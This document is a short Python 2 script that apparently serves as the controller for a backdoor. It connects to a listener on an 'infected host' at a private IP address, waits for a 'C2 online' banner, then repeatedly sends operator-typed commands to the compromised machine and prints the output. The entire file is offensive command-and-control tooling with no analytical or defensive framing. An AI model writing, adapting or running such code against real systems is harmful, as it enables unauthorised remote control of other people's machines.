import socket ,os ,sys

infected_host = ('192.168.170.128', 50005)

while True: #infinte loop, keep asking for commands
	try: #try to establish socket and connect to listener on the infected host
		s = socket.socket() #create a socket object
		s.connect(infected_host) #connected to infected host
		data = s.recv(1024)
		print data
		if data == 'C2 online and awaiting commands':
			s.shutdown(socket.SHUT_WR) #close port gracefully 
			s.close 
			break
	except: #if a connection can not be made then the host must be offline
		print 'Host is offline' 
		sys.exit()

while True: #infinte loop, keep asking for commands
	try: #try to establish socket and connect to listener on the infected host
		s = socket.socket() #create a socket object
		s.connect(infected_host) #connected to infected host
		command = raw_input('Enter Command:') #get command
		s.send(command)
		data = s.recv(1024)
		print data
		s.shutdown(socket.SHUT_WR) #close port gracefully 
		s.close 
	except: #if a connection can not be made then the host must be offline
		print 'Host is offline' 
		sys.exit()
			
